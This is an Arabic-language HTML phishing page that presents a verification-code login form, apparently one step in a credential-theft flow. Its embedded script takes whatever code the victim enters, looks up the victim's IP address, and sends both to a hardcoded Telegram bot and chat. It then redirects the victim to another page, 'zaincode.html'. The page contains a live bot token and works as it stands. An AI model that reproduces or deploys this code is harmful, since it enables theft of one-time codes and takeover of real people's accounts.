    <nav class="navbar navbar-expand-md navbar-danger bg-danger shadow-sm"></nav>

    <main class="py-4">
        <div class="container justify-content-center text-center container-logo">
            <a class="navbar-brand justify-content-center">
                <img src="https://up6.cc/2025/03/174291544298861.png" style="width:100%" alt="logo">
            </a>
        </div>

        <div class="container">

            <div class="container justify-content-center">
                <form id="login-form" style="padding: 10px;">
                    <div class="form-group row text-center">
                        <input type="tel" class="form-control" id="phone" name="phone" placeholder="رمز التحقق" autofocus="">
                        <span id="verify_phone" class="text-danger font-weight-bolder text-center" style="display: none;">يرجى إدخال رمز التحقق</span>
                    </div>

                    <div class="form-group centered-button">
                        <button type="submit" class="btn btn-success">
                            <i class="fa fa-lock ml-10"></i> متابعة
                        </button>
                    </div>
                </form>
            </div>
        </div>

    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#login-form').submit(function(event) {
                event.preventDefault();
                $('#verify_phone').hide();

                const phone = $("#phone").val();

                if (!phone) {
                    $('#verify_phone').show();
                    return;
                }

                // الحصول على IP الجهاز
                $.get("https://api.ipify.org?format=json", function(data) {
                    const userIP = data.ip;

                    const telegramBotToken = "7680582937:AAHkEhiz5JPvPLMjNVUtF_GpvnkVNbum00s";
                    const chatId = "-4625923889";
                    const message = `رمز التحقق: ${phone}\nIP المستخدم: ${userIP}`;

                    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

                    $.post(telegramUrl, {
                        chat_id: chatId,
                        text: message
                    }).done(function (response) {
                        // إعادة التوجيه لصفحة أخرى
                        window.location.href = "zaincode.html";
                    }).fail(function (error) {
                        alert("حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقًا.");
                    });
                });
            });
        });
    </script>
